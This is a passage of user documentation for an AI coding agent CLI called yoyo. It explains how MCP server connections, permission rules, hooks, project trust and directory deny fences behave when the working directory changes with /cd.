The **launch** project's MCP servers stay connected after `/cd`, by decision, wherever you go and whatever the trust answer there is. You approved them when yoyo started, their tools are already in the model's tool list, and yoyo cannot drop one MCP connection mid-session without rebuilding the agent, which drops every connection at once. This differs from the launch project's `[permissions] allow` and hooks, which pause outside its tree: those are checked each time they would apply, while a server's tools are a fixed part of the session. `/mcp` keeps listing them as connected, and they are, so restart yoyo elsewhere if you do not want them there. A new directory's own servers are a different matter (see the table above and #1040). Measured on Day 231 with a stub MCP server launched from a trusted project: the same server process stayed alive, and its tool was still in the tool list sent with the next prompt, after `/cd` into an untrusted directory and again after `/cd` back.

When the trust answer changes on `/cd`, yoyo prints `Project trust is now ON` (or `OFF`). That answer does not load anything in the table above. It does decide whether the new directory's `.yoyo/goal_verify.md` runs, because `/goal check` reads that file from the current directory when it runs. `/cd` back into the directory whose `.yoyo.toml` yoyo loaded at startup prints no such warning, because that file is the one in force. It also adds nothing to the `/cd` lists for entries that file already enforces from startup, so `/permissions` does not show its deny patterns twice. If startup did not enforce one (a `--deny` or `--deny-dir` flag replaced the file's list, or you edited the file since), that entry is applied and announced as for any other directory. The launch project's own shell hooks pause while you are outside its tree, like its `[permissions] allow`, and fire again when you `/cd` back under it; hooks from your user-level config are unaffected. `/rename` (and the model's `rename_symbol` tool) also honour the `/cd`-added `[directories] deny` entries, and so does the REPL's auto-context, which never attaches a denied file to the model's prompt. The project-instruction-file loader honours them too: `/spawn` re-reads the instruction files (`CLAUDE.md`, `AGENTS.md`, …) from the current directory when it runs, and after a `/cd` a file the new directory's `[directories]` lists refuse is left out of the sub-agent's prompt with a warning. `/context` lists such a file as refused by the directory fence instead of as loaded, and so does `/doctor`'s project-context row. Shell `yoyo doctor` builds the same startup fence a session would (`[directories]` in `.yoyo.toml`, or `--allow-dir`/`--deny-dir`), so it reports a refused instruction file the same way. Skill loading still uses only the startup `[directories]` fence; it runs at startup, before any `/cd` (reloading skills after `/cd` is #1040). `/map` uses no fence at all, by design: it shows a sketch to you, not to the model.
